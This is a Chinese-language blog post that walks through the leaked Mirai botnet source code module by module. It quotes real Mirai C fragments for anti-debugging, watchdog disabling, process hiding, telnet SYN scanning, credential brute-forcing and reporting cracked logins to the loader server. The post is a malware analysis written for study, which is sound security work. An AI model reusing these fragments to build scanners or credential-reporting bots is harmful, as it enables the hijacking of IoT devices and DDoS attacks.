<!DOCTYPE html><html lang="zh-Hans"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="我随便写，你随便看。"><title>Mirai源码阅读 | Ciaran Chen 的博客</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script src="https://www.googletagmanager.com/gtag/js?id=UA-125805814-1" async></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-125805814-1');
</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement('script');
  hm.src = 'https://hm.baidu.com/hm.js?' + '264aaaa76ee702a5b65385936f19abeb';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();</script><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Mirai源码阅读</h1><a id="logo" href="/.">Ciaran Chen 的博客</a><p class="description">随便写写。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Mirai源码阅读</h1><div class="post-meta">2018-10-09<span> | </span><span class="category"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></span></div><div class="post-content"><p>代码可以从<a href="https://github.com/jgamblin/Mirai-Source-Code"><code>https://github.com/jgamblin/Mirai-Source-Code </code></a>下载。</p>
<p>一些基本的名称是这样的。攻击者将部署一个<code>Commad &amp; Control</code>CNC 的节点和一个<code>loader</code> 的服务器，然后将感染的设备称为<code>bot</code>，并在其中运行程序<code>payload</code>。</p>
<span id="more"></span>

<p>Marai 各个部分的主要功能如下：</p>
<ul>
<li>loader（<code>loader/src</code>）： 监听bot的report，并上传payload到要感染的设备</li>
<li>cnc（<code>mirai/cnc</code>）： 即控制服务器，主要功能是处理用户登录和下发命令</li>
<li>bot（<code>mirai/bot</code>）： 运行僵尸程序</li>
</ul>
<blockquote>
<p> 注：源码中其它部分（<code>mirai/tools</code>、<code>script/</code>、<code>dlr/</code>）不再关注。</p>
</blockquote>
<p>代码中，CNC部分是由Go语言编写的，余下都由C语言编码完成。因此我们需要Go语言的环境。</p>
<p>Mirai的主要感染途径是通过设备的默认密码。在感染后，可以通过ssh和Telnet连接对其他设备进行感染，或在cnc的指挥下对其它网络设备发起DDos攻击。</p>
<h2 id="Cnc-部分"><a href="#Cnc-部分" class="headerlink" title="Cnc 部分"></a>Cnc 部分</h2><p>cnc目录主要提供用户管理的接口、处理攻击请求并下发攻击命令。这个目录要求在安装的主机中存在Mysql。它会将管理员和bot的数据，甚至可以使用的命令以及历史存放在数据库中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin.go      处理用户登录、创建新用户以及进行攻击</span><br><span class="line">api.go        说明api的处理方式</span><br><span class="line">attack.go     处理如何进行攻击</span><br><span class="line">clientList.go 管理感染的bot节点</span><br><span class="line">database.go   数据库管理，包括用户登录验证、新建用户、白名单、验证用户的攻击请求</span><br><span class="line">main.go       程序入口，开启23端口和101端口的监听</span><br></pre></td></tr></table></figure>

<p>在<code>main.go</code>中可以看到监听了23和101并分别调用了<code>initialHandler</code>和<code>apiHandler</code>两个函数。</p>
<p>首先跟随<code>initialHandler </code>，若接受数据长度为4，且分别为<code>00 00 00 x</code>(x&gt;0)时，为bot监听，将对应的bot主机添加为新的bot。</p>
<p>否则，则判断是否是管理员并进行登录，如果成功登录，则可以通过命令发动攻击。而且如果是管理员账号，还可以通过命令执行管理员帐户添加<code>adduser</code>和查询bot数量<code>botcount</code>等。</p>
<p><code>ApiHandler</code>中则是提供了另一种访问方式，是为了更方便地调用bot进行攻击而设置的。</p>
<p>可以在<code>attack.go</code>中看到，<code>Mirai</code>所支持的攻击类型包括udp、vse、dns、syn、ack、stomp、GRE ip flood、GRE Ethernet flood、http等。（还有很多我并不认识。）当然这些进行攻击的类型都只是发一段特定的代码到bot，然后由所有bot一起进行即可。</p>
<h2 id="Bot-部分（Pyload）"><a href="#Bot-部分（Pyload）" class="headerlink" title="Bot 部分（Pyload）"></a>Bot 部分（Pyload）</h2><p>bot源码主要有：</p>
<ul>
<li>attack模块：解析下发的命令，发起DoS攻击</li>
<li>scanner模块：扫描telnet弱口令登录，上报给loader</li>
<li>killer模块：占用端口，kill同类僵尸（排除异己）</li>
<li>public模块： utils</li>
</ul>
<p>但是在此之前先看看<code>main</code>函数中启动之前一通熟练地操作：</p>
<ul>
<li><p>首先阻止<code>gdb</code>和<code>watchdog</code>的调试。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Signal based control flow</span></span><br><span class="line">sigemptyset(&amp;sigs);</span><br><span class="line">sigaddset(&amp;sigs, SIGINT);</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;sigs, <span class="literal">NULL</span>);</span><br><span class="line">signal(SIGCHLD, SIG_IGN);</span><br><span class="line">signal(SIGTRAP, &amp;anti_gdb_entry);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prevent watchdog from rebooting device</span></span><br><span class="line"><span class="keyword">if</span> ((wfd = open(<span class="string">&quot;/dev/watchdog&quot;</span>, <span class="number">2</span>)) != <span class="number">-1</span> ||</span><br><span class="line">    (wfd = open(<span class="string">&quot;/dev/misc/watchdog&quot;</span>, <span class="number">2</span>)) != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> one = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ioctl(wfd, <span class="number">0x80045704</span>, &amp;one);</span><br><span class="line">    close(wfd);</span><br><span class="line">    wfd = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb 会通过信号来停止程序，既然如此，就一旦接受到 <code>SIGTRAP</code>就直接退出以禁止调试。</p>
<p>然后向在特定位置的看门狗程序发送控制码<code>0×80045704</code>禁用看门狗，以防止自动重启。通常在嵌入式设备中，固件会实现一种叫看门狗(watchdog)的功能，有一个进程会不断的向看门狗进程发送一个字节数据，这个过程叫喂狗。如果喂狗过程结束，那么设备就会重启，因此为了防止设备重启，Mirai关闭了看门狗功能。</p>
</li>
<li><p>然后是调用<code>ensure_single_instance()</code>用于确保只有一个实例的程序在运行。</p>
<p>方法是绑定一个特定的端口48101。如果有进程已经占用了这个端口，就直接把它kill掉，这样每个同样的程序绑定这个端口的时候，就会被下一个启动的实例给kill掉。</p>
<p>但是同样，这个特点是检测网络设备中是否存在<code>Mirai</code>的最高效的检测方法。</p>
</li>
<li><p>隐藏进程。</p>
<p>修改<code>args[0] </code>即运行程序的命令。</p>
<p>将进程名变为随机的字符。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hide argv0</span></span><br><span class="line">name_buf_len = ((rand_next() % <span class="number">4</span>) + <span class="number">3</span>) * <span class="number">4</span>;</span><br><span class="line">rand_alphastr(name_buf, name_buf_len);</span><br><span class="line">name_buf[name_buf_len] = <span class="number">0</span>;</span><br><span class="line">util_strcpy(args[<span class="number">0</span>], name_buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hide process name</span></span><br><span class="line">name_buf_len = ((rand_next() % <span class="number">6</span>) + <span class="number">3</span>) * <span class="number">4</span>;</span><br><span class="line">rand_alphastr(name_buf, name_buf_len);</span><br><span class="line">name_buf[name_buf_len] = <span class="number">0</span>;</span><br><span class="line">prctl(PR_SET_NAME, name_buf);</span><br></pre></td></tr></table></figure>
</li>
<li><p>初始化攻击 <code>attack_init()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">attack_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);</span><br><span class="line">    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);</span><br><span class="line">    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);</span><br><span class="line">	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);</span><br><span class="line"></span><br><span class="line">    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);</span><br><span class="line">    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);</span><br><span class="line">    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);</span><br><span class="line"></span><br><span class="line">    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);</span><br><span class="line">    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);</span></span><br><span class="line">    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这之中，只是添加了一些可以进攻的方式，还没有实际进行攻击，所以这里面的函数我们稍后再看。</p>
</li>
</ul>
<h3 id="Killer-模块-killer-c"><a href="#Killer-模块-killer-c" class="headerlink" title="Killer 模块 killer.c"></a>Killer 模块 <code>killer.c</code></h3><p><code>main()</code>函数在此后调用了killer模块 <code>killer_init()</code>Killer模块主要是负责排除其他同类的病毒，以防止被抢走控制权。</p>
<p>在这个函数中，它会首先检测占用并杀死可能存在的进程，然后直接抢占 22&#x2F;23&#x2F;80 端口。这主要是为了排除异己，防止其他程序通过ssh&#x2F;telnet&#x2F;http的方式获得控制权。</p>
<p>在此后，他还会搜索特定的文件夹<code>/proc/$pid/exe</code>，在这个文件夹中包含了所有正在运行中的进程的程序链接，然后它通过链接直接看程序的真实名称是否含有<code>.anime</code>，一旦含有就直接杀死。</p>
<p>实际上这个程序在添加了其他逻辑之后，很快就能针对其他程序进行清除。这里大概只是用<code>anime</code>做了一个典型而已。毕竟<code>Mirai</code>还扫描了<code>/proc/$pid/status</code>文件，在这个文件中存着进程的一些信息，Killer模块也能根据这些信息对特定的进程进行杀死。</p>
<h3 id="Scanner-模块-Scanner-c"><a href="#Scanner-模块-Scanner-c" class="headerlink" title="Scanner 模块 Scanner.c"></a>Scanner 模块 <code>Scanner.c</code></h3><p>在killer之后，在主循环之前，<code>main()</code>调用了一个Scanner模块<code>scanner_init()</code>。Scanner即扫描器，他所做的是扫描网络中其它未被感染的主机，然后用弱口令尝试登陆，并将能登陆的主机的信息上报给loader，然后由loader对主机进行侵略。</p>
<p>在此模块中，扫描的ip地址是随机生成的，并会排除一定的ip地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    tmp = rand_next();</span><br><span class="line"></span><br><span class="line">    o1 = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">    o2 = (tmp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    o3 = (tmp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    o4 = (tmp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (o1 == <span class="number">127</span> ||                             <span class="comment">// 127.0.0.0/8      - Loopback</span></span><br><span class="line">      (o1 == <span class="number">0</span>) ||                              <span class="comment">// 0.0.0.0/8        - Invalid address space</span></span><br><span class="line">      (o1 == <span class="number">3</span>) ||                              <span class="comment">// 3.0.0.0/8        - General Electric Company</span></span><br><span class="line">      (o1 == <span class="number">15</span> || o1 == <span class="number">16</span>) ||                 <span class="comment">// 15.0.0.0/7       - Hewlett-Packard Company</span></span><br><span class="line">      (o1 == <span class="number">56</span>) ||                             <span class="comment">// 56.0.0.0/8       - US Postal Service</span></span><br><span class="line">      (o1 == <span class="number">10</span>) ||                             <span class="comment">// 10.0.0.0/8       - Internal network</span></span><br><span class="line">      (o1 == <span class="number">192</span> &amp;&amp; o2 == <span class="number">168</span>) ||               <span class="comment">// 192.168.0.0/16   - Internal network</span></span><br><span class="line">      (o1 == <span class="number">172</span> &amp;&amp; o2 &gt;= <span class="number">16</span> &amp;&amp; o2 &lt; <span class="number">32</span>) ||     <span class="comment">// 172.16.0.0/14    - Internal network</span></span><br><span class="line">      (o1 == <span class="number">100</span> &amp;&amp; o2 &gt;= <span class="number">64</span> &amp;&amp; o2 &lt; <span class="number">127</span>) ||    <span class="comment">// 100.64.0.0/10    - IANA NAT reserved</span></span><br><span class="line">      (o1 == <span class="number">169</span> &amp;&amp; o2 &gt; <span class="number">254</span>) ||                <span class="comment">// 169.254.0.0/16   - IANA NAT reserved</span></span><br><span class="line">      (o1 == <span class="number">198</span> &amp;&amp; o2 &gt;= <span class="number">18</span> &amp;&amp; o2 &lt; <span class="number">20</span>) ||     <span class="comment">// 198.18.0.0/15    - IANA Special use</span></span><br><span class="line">      (o1 &gt;= <span class="number">224</span>) ||                            <span class="comment">// 224.*.*.*+       - Multicast</span></span><br><span class="line">      (o1 == <span class="number">6</span> || o1 == <span class="number">7</span> || o1 == <span class="number">11</span> || o1 == <span class="number">21</span> || o1 == <span class="number">22</span> || o1 == <span class="number">26</span> || o1 == <span class="number">28</span> || o1 == <span class="number">29</span> || o1 == <span class="number">30</span> || o1 == <span class="number">33</span> || o1 == <span class="number">55</span> || o1 == <span class="number">214</span> || o1 == <span class="number">215</span>) <span class="comment">// Department of Defense</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在此后列出了一系列的弱密码。</p>
<p>之后是快速扫描的秘密所在，下面这段代码批量对23和2323端口发送 SYN 数据包，只对有response的地址进行响应。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fake_time != last_spew)</span><br><span class="line">&#123;</span><br><span class="line">    last_spew = fake_time;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SCANNER_RAW_PPS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">paddr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> =</span> (<span class="keyword">struct</span> iphdr *)scanner_rawpkt;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> =</span> (<span class="keyword">struct</span> tcphdr *)(iph + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        iph-&gt;id = rand_next();</span><br><span class="line">        iph-&gt;saddr = LOCAL_ADDR;</span><br><span class="line">        iph-&gt;daddr = get_random_ip();</span><br><span class="line">        iph-&gt;check = <span class="number">0</span>;</span><br><span class="line">        iph-&gt;check = checksum_generic((<span class="type">uint16_t</span> *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">10</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            tcph-&gt;dest = htons(<span class="number">2323</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcph-&gt;dest = htons(<span class="number">23</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        tcph-&gt;seq = iph-&gt;daddr;</span><br><span class="line">        tcph-&gt;check = <span class="number">0</span>;</span><br><span class="line">        tcph-&gt;check = checksum_tcpudp(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr)), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr));</span><br><span class="line"></span><br><span class="line">        paddr.sin_family = AF_INET;</span><br><span class="line">        paddr.sin_addr.s_addr = iph-&gt;daddr;</span><br><span class="line">        paddr.sin_port = tcph-&gt;dest;</span><br><span class="line"></span><br><span class="line">        sendto(rsck, scanner_rawpkt, <span class="keyword">sizeof</span> (scanner_rawpkt), MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;paddr, <span class="keyword">sizeof</span> (paddr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于使用的是UDP协议，要从获得的数据包中快速筛选出真正的响应的包</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">errno = <span class="number">0</span>;</span><br><span class="line">n = recvfrom(rsck, dgram, <span class="keyword">sizeof</span> (dgram), MSG_NOSIGNAL, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">0</span> || errno == EAGAIN || errno == EWOULDBLOCK)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tcphdr))</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (iph-&gt;daddr != LOCAL_ADDR)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (tcph-&gt;source != htons(<span class="number">23</span>) &amp;&amp; tcph-&gt;source != htons(<span class="number">2323</span>))</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (tcph-&gt;dest != source_port)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (!tcph-&gt;syn)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (!tcph-&gt;ack)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (tcph-&gt;rst)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (tcph-&gt;fin)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (htonl(ntohl(tcph-&gt;ack_seq) - <span class="number">1</span>) != iph-&gt;saddr)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>

<p>我们会过滤掉：</p>
<ul>
<li>不完整的包</li>
<li>目标非本机地址的包</li>
<li>目标非TCP协议的包</li>
<li>目标来源非23或2323的包</li>
<li>目标非特定端口的包</li>
<li>是SYN或ACK信号</li>
<li>不是RST和FIN信号</li>
<li>最后还判断其ACK序列号是否与前一个相同</li>
</ul>
<p>之后将存活的设备保存到一个数组中。然后随机选取之前设置的弱口令进行爆破:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (FD_ISSET(conn-&gt;fd, &amp;fdset_wr))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> err = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line">                <span class="type">socklen_t</span> err_len = <span class="keyword">sizeof</span> (err);</span><br><span class="line"></span><br><span class="line">                ret = getsockopt(conn-&gt;fd, SOL_SOCKET, SO_ERROR, &amp;err, &amp;err_len);</span><br><span class="line">                <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; ret == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    conn-&gt;state = SC_HANDLE_IACS;</span><br><span class="line">                    conn-&gt;auth = random_auth_entry();</span><br><span class="line">                    conn-&gt;rdbuf_pos = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[scanner] FD%d connected. Trying %s:%s\n&quot;</span>, conn-&gt;fd, conn-&gt;auth-&gt;username, conn-&gt;auth-&gt;password);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[scanner] FD%d error while connecting = %d\n&quot;</span>, conn-&gt;fd, err);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                    close(conn-&gt;fd);</span><br><span class="line">                    conn-&gt;fd = <span class="number">-1</span>;</span><br><span class="line">                    conn-&gt;tries = <span class="number">0</span>;</span><br><span class="line">                    conn-&gt;state = SC_CLOSED;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>然后发送一系列命令判断登录成功与否。若成功，尝试一些操作，并上报loader。</p>
<p>上报loader的格式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> zero = <span class="number">0</span>;</span><br><span class="line">send(fd, &amp;zero, <span class="keyword">sizeof</span> (<span class="type">uint8_t</span>), MSG_NOSIGNAL);</span><br><span class="line">send(fd, &amp;daddr, <span class="keyword">sizeof</span> (<span class="type">ipv4_t</span>), MSG_NOSIGNAL);</span><br><span class="line">send(fd, &amp;dport, <span class="keyword">sizeof</span> (<span class="type">uint16_t</span>), MSG_NOSIGNAL);</span><br><span class="line">send(fd, &amp;(auth-&gt;username_len), <span class="keyword">sizeof</span> (<span class="type">uint8_t</span>), MSG_NOSIGNAL);</span><br><span class="line">send(fd, auth-&gt;username, auth-&gt;username_len, MSG_NOSIGNAL);</span><br><span class="line">send(fd, &amp;(auth-&gt;password_len), <span class="keyword">sizeof</span> (<span class="type">uint8_t</span>), MSG_NOSIGNAL);</span><br><span class="line">send(fd, auth-&gt;password, auth-&gt;password_len, MSG_NOSIGNAL);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Attack-模块"><a href="#Attack-模块" class="headerlink" title="Attack 模块"></a>Attack 模块</h3><p>在做完了上面这两个模块的内容之后，就进入了bot的主循环，它会主动连接CNC节点并等待CNC节点的指令使用<code>attackparse</code>进行解析。</p>
<p>在这里有个小trick，在前面是设定了CNC节点的IP地址和端口<code>FAKE_CNC_ADDR</code>和<code>FAKE_CNC_PORT</code>，但是实际在连接中，这是一个虚假的IP地址和端口，用于迷惑对这个代码进行debug的开发者。真正的IP和端口是在<code>table.c</code>中硬编码写入的<code>cnc.changeme.com</code>用<code>8.8.8.8</code>做DNS解析之后得到的，然后在连接前使用<code>resolve_func()</code>函数对地址进行了修改写入了真的IP地址。</p>
<p>在建立连接后，<code>bot</code>根据接收到的指令（目标数，IP地址，掩码），对目标进行攻击。</p>
<p>在<code>attack_app.c</code>、<code>attack_gre.c</code>、<code>attack_tcp.c</code>和<code>attack_udp.c</code>中分别定义了四大类的攻击类型，然后使用函数指针模拟多态地进行调用。其中攻击的方式大多是通过socket建立大量的SYN包，然后发给目标地址。这里具体就不提。</p>
<h2 id="Loader-部分"><a href="#Loader-部分" class="headerlink" title="Loader 部分"></a>Loader 部分</h2><p>loader代码的功能是向被感染设备上传相应架构的payload文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">headers/       头文件目录</span><br><span class="line">binary.c       将bins目录下的文件读取到内存中，以echo方式上传payload文件时用到</span><br><span class="line">connection.c   判断loader和感染设备telnet交互过程中的状态信息</span><br><span class="line">main.c         loader主函数</span><br><span class="line">server.c       向感染设备发起telnet交互，上传payload文件</span><br><span class="line">telnet_info.c  解析约定格式的telnet信息</span><br><span class="line">util.c         一些常用的公共函数</span><br></pre></td></tr></table></figure>

